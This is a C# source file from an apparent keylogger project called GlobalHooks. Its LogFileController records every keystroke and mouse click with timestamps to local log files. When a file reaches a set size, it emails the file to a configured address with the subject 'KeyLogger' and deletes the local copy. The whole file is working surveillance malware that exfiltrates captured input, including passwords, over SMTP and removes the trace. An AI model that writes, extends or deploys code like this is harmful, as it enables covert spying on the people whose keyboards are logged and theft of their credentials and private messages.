using System;
using System.IO;
using GlobalHooks.Model;

namespace GlobalHooks.Controllers
{
    class LogFileController
    {
        private const string MouseLogFilePath = @"mouse.log";
        private const string KeyboardLogFilePath = @"keyboard.log";
        private readonly ConfigurationInfo _configuration;
        private readonly object _mouseLock = new object();
        private readonly object _keyboardLock = new object();

        public LogFileController(ConfigurationInfo configuration)
        {
            _configuration = configuration;
        }

        public void LogMouseClick(object param)
        {
            var paramArray = ((string)param).Split(' ');
            lock (_mouseLock)
            {
                using (var writer = new StreamWriter(MouseLogFilePath, true))
                {
                    writer.WriteLine($"{DateTime.Now} : Key: {paramArray[0]}, Position: {paramArray[1]}");
                }
                SendLog(MouseLogFilePath);
            }
        }

        public void LogKeyDown(object key)
        {
            lock (_keyboardLock)
            {
                using (var writer = new StreamWriter(KeyboardLogFilePath, true))
                {
                    writer.WriteLine($"{DateTime.Now} : Key: {(string)key}");
                }
                SendLog(KeyboardLogFilePath);
            }
        }

        private void SendLog(string logFilePath)
        {
            if (string.IsNullOrEmpty(_configuration.To) || string.IsNullOrEmpty(_configuration.From) ||
                string.IsNullOrEmpty(_configuration.Password)) return;
            if (new FileInfo(logFilePath).Length < _configuration.FileSize) return;
            new SmtpController(_configuration.From, _configuration.Password).Send(@"KeyLogger", logFilePath,
                _configuration.To);
            new FileInfo(logFilePath).Delete();
        }
    }
}
